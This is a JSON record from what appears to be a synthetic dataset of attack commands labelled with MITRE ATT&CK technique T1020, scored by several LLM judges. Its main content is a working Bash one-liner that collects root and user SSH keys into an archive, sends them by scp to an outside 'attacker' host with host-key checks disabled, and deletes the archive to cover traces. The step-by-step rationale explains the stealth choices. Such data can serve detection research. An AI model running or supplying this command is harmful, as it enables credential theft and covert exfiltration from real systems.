{
  "technique_id": "T1020",
  "platform": "Linux",
  "shell": "Bash",
  "command": "ts=$(date +%s); tar -czf /tmp/sshkeys_${ts}.tgz /root/.ssh $(find /home -maxdepth 2 -type d -name .ssh -print) >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/sshkeys_${ts}.tgz attacker@203.0.113.7:/var/tmp/.cache/.sshkeys/ >/dev/null 2>&1 && rm -f /tmp/sshkeys_${ts}.tgz",
  "explanation": "Collects root and user SSH keys into a single archive and quietly exfiltrates them via scp over a non-standard SSH port to avoid interactive prompts.",
  "rationale_steps": [
    "Enumerate and package SSH key directories for root and users to a single archive.",
    "Use scp with an identity file for automated, passwordless transfer.",
    "Disable host key checking and suppress output to avoid terminal noise and prompts.",
    "Remove the temporary archive after successful upload to reduce local evidence."
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1020-e93662d8-cc327a6d",
  "source_prompt_hash": "e93662d8",
  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Command is well-formed Bash with valid substitutions, flags, redirections, and operator chaining.",
        "semantic_score": 3,
        "semantic_justification": "While tar packaging and scp exfiltration align with T1020, reliance on /root/.ssh and /root/.ssh/id_rsa with 'Privilege: None' will typically prevent access to root files and undermine the stated intent.",
        "combined_score": 4.0,
        "confidence": 0.86,
        "timestamp": "2025-10-01T02:00:29.982662Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags, correct command separators (&&), and appropriate redirection of output.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements automated exfiltration by collecting SSH keys, compressing them with a timestamp, transferring them via SCP to an external server, and cleaning up traces - all core elements of T1020.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T02:00:32.910441Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quoting, valid flags, and proper command separators.",
        "semantic_score": 2,
        "semantic_justification": "The command fundamentally fails to achieve its stated intent of collecting root's SSH keys and using `/root/.ssh/id_rsa` for SCP, as these operations require root privileges which directly conflict with the provided 'Privilege: None' specification.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T02:01:07.677221Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
